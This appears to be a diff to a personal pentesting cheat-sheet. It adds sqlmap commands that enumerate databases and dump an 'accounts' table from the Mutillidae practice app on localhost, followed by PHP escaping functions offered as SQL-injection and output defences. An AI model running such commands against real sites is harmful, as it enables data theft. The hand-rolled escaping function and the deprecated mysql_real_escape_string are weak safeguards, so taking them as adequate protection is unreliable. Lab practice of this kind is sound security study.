@@ -7,3 +7,28 @@
 sqlmap -u "http://<url>?id=1&str=val"
 # SQLmap POST Request with Cookie
 sqlmap -u "http://<url>" --data="id=1&str=val" --cookie="cookie1=val1"
+# SQLmap on Login with schema
+sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" --dbs --dbms=MySQL
+# SQLmap on Login with dump
+sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" -D muti -T accounts --dump
+
+# input sanitization
+mysql_real_escape_string( $str )
+# function that does not require connection
+<?php
+function mysql_escape_mimic($inp) {
+    if(is_array($inp))
+        return array_map(__METHOD__, $inp);
+
+    if(!empty($inp) && is_string($inp)) {
+        return str_replace(array('\\', "\0", "\n", "\r", "'", '"', "\x1a"), array('\\\\', '\\0', '\\n', '\\r', "\\'", '\\"', '\\Z'), $inp);
+    }
+
+    return $inp;
+}
+?>
+# output escape
+htmlspecialchars( $str )
+escapeshellcmd( $cmd )
+escapeshellarg( $cmd )
+preg_quote ( $regex )
